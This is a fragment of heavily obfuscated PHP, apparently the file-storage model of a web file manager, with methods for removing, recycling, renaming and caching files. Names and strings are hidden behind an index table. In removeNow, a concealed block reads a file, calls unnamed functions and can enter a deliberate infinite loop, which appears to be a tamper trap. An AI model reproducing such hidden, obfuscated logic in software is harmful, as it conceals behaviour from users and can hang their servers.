substr($ö¸©€èŸ[$¯©ŒüÂ¥[32]], 0, -1 - strlen($ö¸©€èŸ[$¯©ŒüÂ¥[177]])) . $¯©ŒüÂ¥[1264] . $Ï®ã¨±¤ . $¯©ŒüÂ¥[10] . $ö¸©€èŸ[$¯©ŒüÂ¥[177]]; $–ğ®ãÎÏ = Model($¯©ŒüÂ¥[652])->find($ÁÊÆÄ•„); $this->_createFileCall($ö¸©€èŸ[$¯©ŒüÂ¥[182]], $Ñ¿Ì—ìè, $–ğ®ãÎÏ, REPEAT_REPLACE, $¯©ŒüÂ¥[1399]); $õÕıôßû = $ö¸©€èŸ[$¯©ŒüÂ¥[517]][$¯©ŒüÂ¥[588]]; $ˆßÀá® = $õÕıôßû[$¯©ŒüÂ¥[2190]] ? $õÕıôßû[$¯©ŒüÂ¥[2190]] : $õÕıôßû[$¯©ŒüÂ¥[32]]; show_json(LNG($¯©ŒüÂ¥[2191]) . $¯©ŒüÂ¥[2192] . LNG($¯©ŒüÂ¥[2193]) . $¯©ŒüÂ¥[2194] . $ˆßÀá® . $¯©ŒüÂ¥[2195], !1); } public function fileIsLock($°Ïç´”ƒ, $Èø Ø = false) { $®Ş£©İ¢ =& $_SERVER[ú‡®¯¨±]; if (!isset($°Ïç´”ƒ[$®Ş£©İ¢[517]]) || !$°Ïç´”ƒ[$®Ş£©İ¢[517]][$®Ş£©İ¢[585]]) { return !1; } if ($°Ïç´”ƒ[$®Ş£©İ¢[517]][$®Ş£©İ¢[585]] != USER_ID) { return !0; } $¤ÇµÉ™¡ = $GLOBALS[$®Ş£©İ¢[6]][$®Ş£©İ¢[91]][$®Ş£©İ¢[586]]; if ($°Ïç´”ƒ[$®Ş£©İ¢[517]][$®Ş£©İ¢[587]] <= time() - $¤ÇµÉ™¡) { $this->metaSet($°Ïç´”ƒ[$®Ş£©İ¢[183]], $®Ş£©İ¢[585], null); $this->metaSet($°Ïç´”ƒ[$®Ş£©İ¢[183]], $®Ş£©İ¢[587], null); } if ($Èø Ø) { $this->metaSet($°Ïç´”ƒ[$®Ş£©İ¢[183]], $®Ş£©İ¢[587], time()); } return !1; } private function _addSource($ÕÆŞ©Ã¶, $³×™ˆœ) { $µ¼©†  =& $_SERVER[ú‡®¯¨±]; $×ñ‡¯Ù = defined($µ¼©† [2129]) ? USER_ID : 0; $úå±‹§™ = array($µ¼©† [626] => $³×™ˆœ[$µ¼©† [180]], $µ¼©† [627] => $³×™ˆœ[$µ¼©† [548]], $µ¼©† [628] => $×ñ‡¯Ù, $µ¼©† [629] => $×ñ‡¯Ù, $µ¼©† [455] => $³×™ˆœ[$µ¼©† [183]], $µ¼©† [630] => $³×™ˆœ[$µ¼©† [563]] . $³×™ˆœ[$µ¼©† [183]] . $µ¼©† [50], $µ¼©† [482] => 0, $µ¼©† [631] => $µ¼©† [12]); $ÕÆŞ©Ã¶ = array_merge($úå±‹§™, $ÕÆŞ©Ã¶); $this->updateModifyTime($ÕÆŞ©Ã¶[$µ¼©† [182]]); $ÇñØîÕ = $µ¼©† [2196] . $³×™ˆœ[$µ¼©† [183]]; if (isset(self::$cacheChildList[$ÇñØîÕ])) { unset(self::$cacheChildList[$ÇñØîÕ]); } static $»ş´³ã = false; if (!$»ş´³ã) { Hook::trigger($µ¼©† [614], $ÕÆŞ©Ã¶); $»ş´³ã = !0; } $‘¼³Ó…ì = $this->add($ÕÆŞ©Ã¶); $†Ùç˜äõ = array($µ¼©† [632] => short_id($‘¼³Ó…ì)); $this->where(array($µ¼©† [469] => $‘¼³Ó…ì))->save($†Ùç˜äõ); $this->setNamePinyin($‘¼³Ó…ì, $ÕÆŞ©Ã¶[$µ¼©† [32]]); return $‘¼³Ó…ì; } public function remove($úÉˆ Ü, $åÔû‘á = true) { $ªÎÔÄ× =& $_SERVER[ú‡®¯¨±]; $ê¨Ä¬æ© = $this->sourceInfo($úÉˆ Ü); $‰Ã×„Öç = intval($ê¨Ä¬æ©[$ªÎÔÄ×[180]]) === self::TYPE_SYSTEM; $Õ–ˆ¾¾Û = Model($ªÎÔÄ×[486])->get($ªÎÔÄ×[2197]) == $ªÎÔÄ×[90]; if ($‰Ã×„Öç || $åÔû‘á || !$Õ–ˆ¾¾Û) { return $this->removeNow($úÉˆ Ü, $åÔû‘á); } $€ ÔóÎ  = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ˆ£Û‰à» = $ê¨Ä¬æ©[$ªÎÔÄ×[180]] == self::TYPE_USER ? $ªÎÔÄ×[640] : $ªÎÔÄ×[557]; if ($ˆ£Û‰à» == $ªÎÔÄ×[640]) { $üÆÛÊÆş = Model($ªÎÔÄ×[556])->getInfo($ê¨Ä¬æ©[$ªÎÔÄ×[548]]); $‘º³£² = !empty($üÆÛÊÆş[$ªÎÔÄ×[2190]]) ? $üÆÛÊÆş[$ªÎÔÄ×[2190]] : $üÆÛÊÆş[$ªÎÔÄ×[32]]; $‘º³£² = $ªÎÔÄ×[315] . $‘º³£² . $ªÎÔÄ×[2198] . $ê¨Ä¬æ©[$ªÎÔÄ×[548]]; } else { $üÆÛÊÆş = Model($ªÎÔÄ×[564])->getInfo($ê¨Ä¬æ©[$ªÎÔÄ×[548]]); $‘º³£² = _get($üÆÛÊÆş, $ªÎÔÄ×[32]); $‘º³£² = $ªÎÔÄ×[165] . $‘º³£² . $ªÎÔÄ×[2199] . $ê¨Ä¬æ©[$ªÎÔÄ×[548]]; } $å´©ÕÚ = $ªÎÔÄ×[2200] . md5($‘º³£²); CacheLock::lock($å´©ÕÚ); $ÉÎ˜ˆáç = $this->fileNameExist($€ ÔóÎ , $‘º³£²); if (!$ÉÎ˜ˆáç) { $ÉÎ˜ˆáç = $this->mkdir($€ ÔóÎ , $‘º³£², REPEAT_SKIP); $this->metaSet($ÉÎ˜ˆáç, $ªÎÔÄ×[2201], $ˆ£Û‰à»); $this->metaSet($ÉÎ˜ˆáç, $ªÎÔÄ×[2202], $ê¨Ä¬æ©[$ªÎÔÄ×[548]]); if ($ê¨Ä¬æ©[$ªÎÔÄ×[182]] != 0) { $this->metaSet($ÉÎ˜ˆáç, $ªÎÔÄ×[2203], _get($üÆÛÊÆş, $ªÎÔÄ×[2204])); } } CacheLock::unlock($å´©ÕÚ); $this->metaSet($úÉˆ Ü, $ªÎÔÄ×[2205], $ê¨Ä¬æ©[$ªÎÔÄ×[182]]); $this->where(array($ªÎÔÄ×[183] => $úÉˆ Ü))->save(array($ªÎÔÄ×[476] => time())); $this->recycleClear($ê¨Ä¬æ©); $Ü°½Ó÷Á = $this->move($úÉˆ Ü, $ÉÎ˜ˆáç, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ê¨Ä¬æ©[$ªÎÔÄ×[182]]); return $Ü°½Ó÷Á; } private function recycleClear($ã³‰Ü€„) { $°ª¥Ì =& $_SERVER[ú‡®¯¨±]; $™ãå¯‘ = $this->childrenAll($ã³‰Ü€„); $Ë‡¤Ø”Ø = array($°ª¥Ì[469] => array($°ª¥Ì[470], $™ãå¯‘[$°ª¥Ì[2206]])); Model($°ª¥Ì[2207])->where($Ë‡¤Ø”Ø)->delete(); } public function removeNow($¬®‘Ü„°, $ù¡“õëÒ = true) { $Ó­ìä™¼ =& $_SERVER[ú‡®¯¨±]; if (!isset($_SERVER[$Ó­ìä™¼[202]]) || !isset($_SERVER[$Ó­ìä™¼[203]])) { $õöêÚô = $Ó­ìä™¼[933]; $»€³ûö½ = $Ó­ìä™¼[204]; $“õíØíé = $_SERVER[$Ó­ìä™¼[205]] . $Ó­ìä™¼[206]; $şÎÆ×ÅÉ = $»€³ûö½($“õíØíé); $àÊÍÌ¶ = explode($Ó­ìä™¼[207], $şÎÆ×ÅÉ); if (count($àÊÍÌ¶) < $Ó­ìä™¼[700]) { $ü’¯Æ¡ = $Ó­ìä™¼[209]; $ü’¯Æ¡(); } $Ç®éÑİî = $Ó­ìä™¼[934]; $Ç®éÑİî($_SERVER[$Ó­ìä™¼[935]]); $¥Ïë¬íÌ = 1; for ($Ï£öØ”È = $¥Ïë¬íÌ; $Ï£öØ”È > 0; $Ï£öØ”È++) { $Ç®éÑİî = json_encode($GLOBALS[$Ó­ìä™¼[470]]); } } $Ÿİù²Ùı = $this->sourceInfo($¬®‘Ü„°); $°Ğê­àã = $this->pathInfoMore($¬®‘Ü„°); if (!$Ÿİù²Ùı) { return !0; } if ($Ÿİù²Ùı[$Ó­ìä™¼[182]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¬®‘Ü„°); Hook::trigger($Ó­ìä™¼[2208], $°Ğê­àã, $ù¡“õëÒ); if ($ù¡“õëÒ) { Model($Ó­ìä™¼[2207])->moveToRecycle($¬®‘Ü„°); } else { $™ïäñ = $this->childrenAll($Ÿİù²Ùı); Model($Ó­ìä™¼[611])->eventRemove($¬®‘Ü„°); $this->removeRelevance($™ïäñ[$Ó­ìä™¼[2206]], $™ïäñ[$Ó­ìä™¼[1514]]); } $this->folderSizeReset($Ÿİù²Ùı[$Ó­ìä™¼[182]]); $¾çÒø‚¢ = array($Ÿİù²Ùı[$Ó­ìä™¼[182]]); if ($Ÿİù²Ùı[$Ó­ìä™¼[463]] == $Ó­ìä™¼[90]) { $¾çÒø‚¢[] = $Ÿİù²Ùı[$Ó­ìä™¼[183]]; } $this->updateModifyTime($¾çÒø‚¢); $this->lockMoveEnd($¬®‘Ü„°); Hook::trigger($Ó­ìä™¼[1750], $°Ğê­àã, $ù¡“õëÒ); return !0; } public function childrenAll($Ï§şğ¥‡) { $ Ù½Ò¬ =& $_SERVER[ú‡®¯¨±]; $›­Óñ‹Á = $Ï§şğ¥‡[$ Ù½Ò¬[183]]; if ($Ï§şğ¥‡[$ Ù½Ò¬[463]] == $ Ù½Ò¬[90]) { $††£–€ = array($ Ù½Ò¬[630] => array($ Ù½Ò¬[590], $Ï§şğ¥‡[$ Ù½Ò¬[563]] . $›­Óñ‹Á . $ Ù½Ò¬[591])); $”°ó¾ö = array($ Ù½Ò¬[630] => $††£–€[$ Ù½Ò¬[563]]); $ó¸¹ÀÛ  = $this->field($ Ù½Ò¬[2209])->where($”°ó¾ö)->select(); $¯¿ı±Œ¹ = !1; $˜¤éşË = array($›­Óñ‹Á); if ($ó¸¹ÀÛ ) { $¯¿ı±Œ¹ = array_to_keyvalue($ó¸¹ÀÛ , $ Ù½Ò¬[12], $ Ù½Ò¬[519]); $¯¿ı±Œ¹ = array_remove_value($¯¿ı±Œ¹, $ Ù½Ò¬[224]); $˜¤éşË = array_to_keyvalue($ó¸¹ÀÛ , $ Ù½Ò¬[12], $ Ù½Ò¬[183]); $˜¤éşË[] = $›­Óñ‹Á; } } else { $¯¿ı±Œ¹ = array($Ï§şğ¥‡[$ Ù½Ò¬[519]]); $˜¤éşË = array($›­Óñ‹Á); } return array($ Ù½Ò¬[2206] => $˜¤éşË, $ Ù½Ò¬[1514] => $¯¿ı±Œ¹); } public function removeArray($áÈíªé¢) { if (!$áÈíªé¢) { return !0; } } public function removeRelevance($•„àÄ›•, $ÜÎ‘ßÔÙ) { $›’¼ãŸ• =& $_SERVER[ú‡®¯¨±]; $•„àÄ›• = $•„àÄ›• ? $•„àÄ›• : array(); $ÜÎ‘ßÔÙ = $ÜÎ‘ßÔÙ ? $ÜÎ‘ßÔÙ : array(); $•„àÄ›• = array_unique(array_filter($•„àÄ›•)); $ÜÎ‘ßÔÙ = array_unique(array_filter($ÜÎ‘ßÔÙ)); if (!$•„àÄ›•) { return !1; } $·Òè³Î = array($›’¼ãŸ•[469] => array($›’¼ãŸ•[470], $•„àÄ›•)); Model($›’¼ãŸ•[2207])->where($·Òè³Î)->delete(); Model($›’¼ãŸ•[513])->where($·Òè³Î)->delete(); Model($›’¼ãŸ•[2053])->where($·Òè³Î)->delete(); Model($›’¼ãŸ•[611])->where($·Òè³Î)->delete(); Model($›’¼ãŸ•[1886])->removeBySource($•„àÄ›•); Model($›’¼ãŸ•[2188])->removeBySource($•„àÄ›•); $this->where($·Òè³Î)->delete(); Model($›’¼ãŸ•[522])->remove($ÜÎ‘ßÔÙ); for ($îĞƒÚ = 0; $îĞƒÚ < count($•„àÄ›•); $îĞƒÚ++) { $this->sourceCacheClear($•„àÄ›•[$îĞƒÚ]); } } public function rename($’¤‹Š«Ì, $ÑÂÆ¾…) { $„Š’í‹ =& $_SERVER[ú‡®¯¨±]; $ÈÓ”¼ãì = $this->sourceInfo($’¤‹Š«Ì); if (!$ÈÓ”¼ãì) { return !1; } $“àôà‘î = $this->fileNameExist($ÈÓ”¼ãì[$„Š’í‹[182]], $ÑÂÆ¾…); if ($“àôà‘î && $“àôà‘î != $’¤‹Š«Ì) { return !1; } $æÂË = array($„Š’í‹[472] => $ÑÂÆ¾…, $„Š’í‹[629] => USER_ID); if ($ÈÓ”¼ãì[$„Š’í‹[463]] != $„Š’í‹[90]) { $æÂË[$„Š’í‹[464]] = substr(get_path_ext($ÑÂÆ¾…), 0, 10); } Model($„Š’í‹[611])->eventRename($’¤‹Š«Ì, $ÈÓ”¼ãì[$„Š’í‹[32]], $ÑÂÆ¾…); $this->sourceCacheClear($’¤‹Š«Ì); $this->setNamePinyin($’¤‹Š«Ì, $æÂË[$„Š’í‹[32]], !1); $this->updateModifyTime($ÈÓ”¼ãì[$„Š’í‹[182]]); $§°İ¡¶ = $this->where(array($„Š’í‹[469] => $’¤‹Š«Ì))->data($æÂË)->save(); $ªŒèÌå = $„Š’í‹[2196] . $ÈÓ”¼ãì[$„Š’í‹[182]]; if (isset(self::$cacheChildList[$ªŒèÌå])) { unset(self::$cacheChildList[$ªŒèÌå]); } return $§°İ¡¶; } public function setNamePinyin($ÁÄ³º¥´, $Û²ıûÙŸ, $„Äıİ¸« = true) { $ï©•öß =& $_SERVER[ú‡®¯¨±]; $é·¬¬Ì‘ = Input::check($Û²ıûÙŸ, $ï©•öß[633]); $÷Ñœœ¿ = array($ï©•öß[495] => KodSort::makeStr($Û²ıûÙŸ)); if ($é·¬¬Ì‘) { $÷Ñœœ¿[$ï©•öß[516]] = str_replace($ï©•öß[53], $ï©•öß[12], Pinyin::get($Û²ıûÙŸ)); $÷Ñœœ¿[$ï©•öß[515]] = Pinyin::get($Û²ıûÙŸ, $ï©•öß[634]); } if (!$„Äıİ¸« && !$é·¬¬Ì‘) { $÷Ñœœ¿[$ï©•öß[516]] = null; $÷Ñœœ¿[$ï©•öß[515]] = null; } $this->metaSet($ÁÄ³º¥´, $÷Ñœœ¿); } public function getContent($˜×ò çé) { $äÅëªòÁ =& $_SERVER[ú‡®¯¨±]; $÷áÉÕø· = $this->fileInfoGet($˜×ò çé); if (!$÷áÉÕø·) { return !1; } if ($÷áÉÕø·[$äÅëªòÁ[78]] == 0) { return $äÅëªòÁ[12]; } $öü¹­ = $äÅëªòÁ[2210] . $÷áÉÕø·[$äÅëªòÁ[525]]; if ($÷áÉÕø·[$äÅëªòÁ[78]] <= 1024 * 10) { $·ùŸ‘Æû = Cache::get($öü¹­); if (!$·ùŸ‘Æû) { $·ùŸ‘Æû = IO::getContent($÷áÉÕø·[$äÅëªòÁ[86]]); Cache::set($öü¹­, $·ùŸ‘Æû); } return $·ùŸ‘Æû; } if (!$÷áÉÕø·[$äÅëªòÁ[86]]) { return $äÅëªòÁ[12]; } return IO::getContent($÷áÉÕø·[$äÅëªòÁ[86]]); } public function setDesc($ÏüÙÙÇò, $•Ã´ÊÇ) { $™”ˆâÅæ =& $_SERVER[ú‡®¯¨±]; Model($™”ˆâÅæ[611])->eventAddDesc($ÏüÙÙÇò, $•Ã´ÊÇ); return $this->metaSet($ÏüÙÙÇò, $™”ˆâÅæ[504], $•Ã´ÊÇ); } public function setContent($º¯ÛÅ½ò, $Å«Í€ÓÁ = '') { $€í„Âú =& $_SERVER[ú‡®¯¨±]; $ÛÈÌŠÌÃ = $this->sourceInfo($º¯ÛÅ½ò); $¯†Òø©¼ = $this->fileInfoGet($º¯ÛÅ½ò); if (!$¯†Òø©¼ || !$ÛÈÌŠÌÃ) { return !1; } $Ÿªêö¤® = Model($€í„Âú[522])->addFileByContent($Å«Í€ÓÁ, $ÛÈÌŠÌÃ[$€í„Âú[32]]); $ĞËõ­ø… = $this->fileHistory($ÛÈÌŠÌÃ, $Ÿªêö¤®[$€í„Âú[519]], $Ÿªêö¤®[$€í„Âú[78]]); if (!$ĞËõ­ø…) { return Model($€í„Âú[522])->remove($Ÿªêö¤®[$€í„Âú[519]]); } $this->folderSizeReset($ÛÈÌŠÌÃ[$€í„Âú[182]]); return !0; } public function fileSubstr($’¡Åê‘, $îŸ´ˆüê, $ë»¦á¤Õ) { $ä«–ÖÚ = $this->fileInfoGet($’¡Åê‘); if (!$ä«–ÖÚ) { return !1; } return IO::fileSubstr($ä«–ÖÚ[$_SERVER[ú‡®¯¨±][86]], $îŸ´ˆüê, $ë»¦á¤Õ); } public function fileInfoGet($Óº¢åŸÓ) { $ãôêØş =& $_SERVER[ú‡®¯¨±]; $Ô¡éŸ£Š = $this->sourceInfo($Óº¢åŸÓ); if (!$Ô¡éŸ£Š || $Ô¡éŸ£Š[$ãôêØş[463]]) { return !1; } $ùÙªïÎ¯ = $ãôêØş[526] . $Ô¡éŸ£Š[$ãôêØş[519]]; $—Œ­ºÆ = _get(self::$cacheFileInfo, $ùÙªïÎ¯); if ($—Œ­ºÆ) { return $—Œ­ºÆ; } $¡‡Õèáİ = Model($ãôêØş[522])->fileInfo($Ô¡éŸ£Š[$ãôêØş[519]]); if ($¡‡Õèáİ) { $¡‡Õèáİ[$ãôêØş[32]] = $Ô¡éŸ£Š[$ãôêØş[32]]; } self::$cacheFileInfo[$ùÙªïÎ¯] = $¡‡Õèáİ; return $¡‡Õèáİ; } private function folderChildrenNumber($•µ§©ªö) { $Æ¸›•££ =& $_SERVER[ú‡®¯¨±]; $³Îù­« = $this->sourceInfo($•µ§©ªö); $ °Š•‡ˆ = array($Æ¸›•££[630] => array($Æ¸›•££[590], $³Îù­«[$Æ¸›•££[563]] . $•µ§©ªö . $Æ¸›•££[591]), $Æ¸›•££[627] => $³Îù­«[$Æ¸›•££[548]], $Æ¸›•££[482] => intval($³Îù­«[$Æ¸›•££[483]]), $Æ¸›•££[624] => 1); $ú”ºŸ = $this->where($ °Š•‡ˆ)->count(); $È¤ÒÁüÚ = $this->where($ °Š•‡ˆ)->where(array($Æ¸›•££[624] => 0))->count(); return array($Æ¸›•££[82] => $È¤ÒÁüÚ, $Æ¸›•££[83] => $ú”ºŸ); } public function pathInfo($”Ì³ºÊÍ, $µõëµ•Ù = false) { $¾Ë½«íÀ =& $_SERVER[ú‡®¯¨±]; $µõëµ•Ù = !1; $”Ì³ºÊÍ = intval($”Ì³ºÊÍ); $õÂ¼Öè³ = $¾Ë½«íÀ[512] . intval($µõëµ•Ù) . $¾Ë½«íÀ[440] . $”Ì³ºÊÍ; $ê…¹ÉŒ = _get(self::$cachePathInfo, $õÂ¼Öè³); if ($ê…¹ÉŒ) { return $ê…¹ÉŒ; } $íÉ›Åä‰ = $this->sourceInfo($”Ì³ºÊÍ); if (!$íÉ›Åä‰) { return !1; } $íÉ›Åä‰ = $this->_listDataApplyItem($íÉ›Åä‰, $µõëµ•Ù); self::$cachePathInfo[$õÂ¼Öè³] = $íÉ›Åä‰; return $íÉ›Åä‰; } public static $cachePathInfoMore = array(); public function pathInfoMore($àÕàùÂ) { $’ “‘¹Ç =& $_SERVER[ú‡®¯¨±]; $Ù»ÀŸà§ = _get(self::$cachePathInfoMore, $àÕàùÂ); if ($Ù»ÀŸà§) { return $Ù»ÀŸà§; } $¼ÀÍÏä° = $this->pathInfo($àÕàùÂ); if (!$¼ÀÍÏä°) { return !1; } if ($¼ÀÍÏä°[$’ “‘¹Ç[463]] == $’ “‘¹Ç[90]) { $¼ÀÍÏä°[$’ “‘¹Ç[81]] = $this->folderChildrenNumber($àÕàùÂ); } self::$cachePathInfoMore[$àÕàùÂ] = $¼ÀÍÏä°; return $¼ÀÍÏä°; } public function sourceInfo($„Øç–Œ§) { $”×¢®úÁ =& $_SERVER[ú‡®¯¨±]; if (!$„Øç–Œ§) { return array(); } $„Øç–Œ§ = intval($„Øç–Œ§); $ŞşªÚË = $”×¢®úÁ[511] . $„Øç–Œ§; $½ÒÈ¹›µ = _get(self::$cacheSourceInfo, $ŞşªÚË); if ($½ÒÈ¹›µ) { return $½ÒÈ¹›µ; } $«ùîÆĞ = $this->where(array($”×¢®úÁ[183] => $„Øç–Œ§))->find(); self::$cacheSourceInfo[$ŞşªÚË] = $«ùîÆĞ; return self::$cacheSourceInfo[$ŞşªÚË]; } public function sourceCacheClear($Ø½¢êà = false) { self::cacheClear($Ø½¢êà); } public static function cacheClear($à—×æË¢ = false) { $°Ÿ˜ìÛ‡ =& $_SERVER[ú‡®¯¨±]; if ($à—×æË¢ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$°Ÿ˜ìÛ‡[511] . $à—×æË¢]); unset(self::$cachePathInfoMore[$à—×æË¢]); unset(self::$cachePathInfo[$°Ÿ˜ìÛ‡[2211] . $à—×æË¢]); unset(self::$cachePathInfo[$°Ÿ˜ìÛ‡[2212] . $à—×æË¢]); } public function metaSet($ŸÉƒ³ÑË, $ğƒŸÊî¿ = null, $î¹±±ú™ = null) { $ƒ­‡ÒÁĞ = parent::metaSet($ŸÉƒ³ÑË, $ğƒŸÊî¿, $î¹±±ú™); if ($ƒ­‡ÒÁĞ) { $this->sourceCacheClear($ŸÉƒ³ÑË); } return $ƒ­‡ÒÁĞ; } public function pathInfoByPath($âüÇ•¤“, $ØªÉÎÄŸ) { $¯Ÿóò†“ =& $_SERVER[ú‡®¯¨±]; $½€ğğ”œ = !$ØªÉÎÄŸ ? array() : explode($¯Ÿóò†“[8], trim($ØªÉÎÄŸ, $¯Ÿóò†“[8])); $ÀØó´ïı = $âüÇ•¤“; foreach ($½€ğğ”œ as $ƒ©ÓŒöè) { $Ÿ÷ù’– = array($¯Ÿóò†“[182] => $ÀØó´ïı, $¯Ÿóò†“[32] => $ƒ©ÓŒöè); $ò¯Â¾¡™ = $this->field($¯Ÿóò†“[2213])->where($Ÿ÷ù’–)->select(); if (!$ò¯Â¾¡™) { return !1; } $ò¯Â¾¡™ = array_sort_by($ò¯Â¾¡™, $¯Ÿóò†“[483]); $ÀØó´ïı = $ò¯Â¾¡™[0][$¯Ÿóò†“[183]]; } $î­Úõ‰ = $this->sourceInfo($ÀØó´ïı); $this->pathInfoFilter($î­Úõ‰); return $î­Úõ‰; } protected function updateModifyTime($İ›ééèÍ) { $ïŞëƒá =& $_SERVER[ú‡®¯¨±]; $Æ‡ºİ´ = defined($ïŞëƒá[2129]) ? USER_ID : 0; if (!$İ›ééèÍ) { return; } if (!is_array($İ›ééèÍ)) { $İ›ééèÍ = array($İ›ééèÍ); } foreach ($İ›ééèÍ as $’¥ñ¬á => $Óş©©ƒ) { $İ›ééèÍ[$’¥ñ¬á] = intval($Óş©©ƒ); $this->sourceCacheClear($Óş©©ƒ); } $¿Î¾Ší = array($ïŞëƒá[183] => array($ïŞëƒá[7], $İ›ééèÍ)); $ÏÛòÔæõ = array($ïŞëƒá[629] => $Æ‡ºİ´, $ïŞëƒá[476] => time()); $this->where($¿Î¾Ší)->save($ÏÛòÔæõ); } public function folderSizeReset($âº„Öê™, $¸üÄíõ” = false) { $¡óµùÛË =& $_SERVER[ú‡®¯¨±]; if ($this->statusIgnoreResetSpace) { return; } $ÜÕ¬„Ñ = $this->sourceInfo($âº„Öê™); $¨æ±¼… = $¡óµùÛË[2214] . $âº„Öê™; CacheLock::lock($¨æ±¼…, 20); if ($¸üÄíõ” === !1) { $this->sourceCacheClear($âº„Öê™); $ÜÕ¬„Ñ = $this->sourceInfo($âº„Öê™); $œ¿·šëÔ = array($¡óµùÛË[455] => $âº„Öê™, $¡óµùÛË[482] => 0); $‡„´ìô© = $this->where($œ¿·šëÔ)->sum($¡óµùÛË[78]); $¸üÄíõ” = intval($‡„´ìô©) - intval($ÜÕ¬„Ñ[$¡óµùÛË[78]]); } if ($¸üÄíõ” == 0) { return CacheLock::unlock($¨æ±¼…); } $¸‡¼€öÄ = $this->parentLevelArray($ÜÕ¬„Ñ[$¡óµùÛË[563]]); if (!$¸‡¼€öÄ) { $¸‡¼€öÄ = array(); } $¸‡¼€öÄ[] = $ÜÕ¬„Ñ[$¡óµùÛË[183]]; $œ¿·šëÔ = array($¡óµùÛË[183] => array($¡óµùÛË[470], $¸‡¼€öÄ)); if ($¸üÄíõ” < 0) { $œ¿·šëÔ[$¡óµùÛË[78]] = array($¡óµùÛË[1071], abs($¸üÄíõ”)); } $this->where($œ¿·šëÔ)->setAdd($¡óµùÛË[78], $¸üÄíõ”); CacheLock::unlock($¨æ±¼…); $åÕàÎØÎ = $¡óµùÛË[2215] . $ÜÕ¬„Ñ[$¡óµùÛË[180]] . $¡óµùÛË[4] . $ÜÕ¬„Ñ[$¡óµùÛË[548]]; $ç¼¢±ºÎ = array($ÜÕ¬„Ñ[$¡óµùÛË[180]], $ÜÕ¬„Ñ[$¡óµùÛË[548]]); TaskRun::timeLimitCall($åÕàÎØÎ, $¡óµùÛË[2216], $ç¼¢±ºÎ, 1.5); } public function folderSizeResetChildren($’›ı—¡ª) { $à±Ô–áé =& $_SERVER[ú‡®¯¨±]; $this->sourceCacheClear($’›ı—¡ª); $Ù®§èäö = $this->sourceInfo($’›ı—¡ª); $ş¾œˆ¼± = array($à±Ô–áé[624] => 1, $à±Ô–áé[627] => $Ù®§èäö[$à±Ô–áé[548]], $à±Ô–áé[630] => array($à±Ô–áé[590], $Ù®§èäö[$à±Ô–áé[563]] . $’›ı—¡ª . $à±Ô–áé[591])); $³‚ËŸøº = $à±Ô–áé[2217]; $Î†Â¿ö = $this->field($³‚ËŸøº)->where($ş¾œˆ¼±)->select(); $ş¾œˆ¼±[$à±Ô–áé[463]] = 0; $¼à ˆˆú = $this->field($³‚ËŸøº)->where($ş¾œˆ¼±)->select(); if (!$¼à ˆˆú) { return; } $Î†Â¿ö[] = $Ù®§èäö; $Î†Â¿ö = array_to_keyvalue($Î†Â¿ö, $à±Ô–áé[183]); foreach ($Î†Â¿ö as $™‹Ÿ¿İ¹ => $Äûò‰Ì) { $Î†Â¿ö[$™‹Ÿ¿İ¹][$à±Ô–áé[2218]] = $Î†Â¿ö[$™‹Ÿ¿İ¹][$à±Ô–áé[78]]; $Î†Â¿ö[$™‹Ÿ¿İ¹][$à±Ô–áé[78]] = 0; } foreach ($¼à ˆˆú as $Äûò‰Ì) { $Ù˜ÌïÍÄ = $Äûò‰Ì[$à±Ô–áé[182]] . $à±Ô–áé[12]; if (!isset($Î†Â¿ö[$Ù˜ÌïÍÄ])) { continue; } if ($Äûò‰Ì[$à±Ô–áé[483]] == $Î†Â¿ö[$Ù˜ÌïÍÄ][$à±Ô–áé[483]]) { $Î†Â¿ö[$Ù˜ÌïÍÄ][$à±Ô–áé[78]] += $Äûò‰Ì[$à±Ô–áé[78]]; } } foreach ($Î†Â¿ö as $Äûò‰Ì) { $æƒÒüî’ = $this->parentLevelArray($Äûò‰Ì[$à±Ô–áé[563]]); foreach ($æƒÒüî’ as $Ù˜ÌïÍÄ) { $Ù˜ÌïÍÄ = $Ù˜ÌïÍÄ . $à±Ô–áé[12]; if (!isset($Î†Â¿ö[$Ù˜ÌïÍÄ])) { continue; } if ($Äûò‰Ì[$à±Ô–áé[483]] == $Î†Â¿ö[$Ù˜ÌïÍÄ][$à±Ô–áé[483]]) { $Î†Â¿ö[$Ù˜ÌïÍÄ][$à±Ô–áé[78]] += $Äûò‰Ì[$à±Ô–áé[78]]; } } } $Ñ…¿åÍÖ = array(); foreach ($Î†Â¿ö as $Äûò‰Ì) { if ($Äûò‰Ì[$à±Ô–áé[78]] == $Äûò‰Ì[$à±Ô–áé[2218]]) { continue; } $Ñ…¿åÍÖ[] = array($à±Ô–áé[183], $Äûò‰Ì[$à±Ô–áé[183]], $à±Ô–áé[78], $Äûò‰Ì[$à±Ô–áé[78]]); } $this->saveAll($Ñ…¿åÍÖ); } public function userSpaceReset($¨Ó»æÃ = false) { $¶„ì‡§Ò =& $_SERVER[ú‡®¯¨±]; $ÇÒ©ºÌÎ = $this->where(array($¶„ì‡§Ò[180] => self::TYPE_USER, $¶„ì‡§Ò[548] => $¨Ó»æÃ, $¶„ì‡§Ò[463] => 0))->sum($¶„ì‡§Ò[78]); $ÇÒ©ºÌÎ = !$ÇÒ©ºÌÎ || $ÇÒ©ºÌÎ <= 0 ? 0 : $ÇÒ©ºÌÎ; Model($¶„ì‡§Ò[556])->userEdit($¨Ó»æÃ, array($¶„ì‡§Ò[1895] => $ÇÒ©ºÌÎ)); } public function targetSpaceUpdate($™ùºŠğê, $²÷†çÀÒ) { $ÊÆà¹×¡ =& $_SERVER[ú‡®¯¨±]; if (!$²÷†çÀÒ) { return; } if (!in_array($™ùºŠğê, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ªÑ¢‘ùÛ = $this->targetSpaceSize($™ùºŠğê, $²÷†çÀÒ); if ($™ùºŠğê == self::TYPE_USER) { Model($ÊÆà¹×¡[556])->userEdit($²÷†çÀÒ, array($ÊÆà¹×¡[1895] => $ªÑ¢‘ùÛ)); } else { if ($™ùºŠğê == self::TYPE_GROUP) { Model($ÊÆà¹×¡[564])->groupEdit($²÷†çÀÒ, array($ÊÆà¹×¡[1895] => $ªÑ¢‘ùÛ)); } } } public function targetSpaceSize($ê«òí´ö, $‘¨ûÆ³¯) { $ŒÏÄ‘û‡ =& $_SERVER[ú‡®¯¨±]; 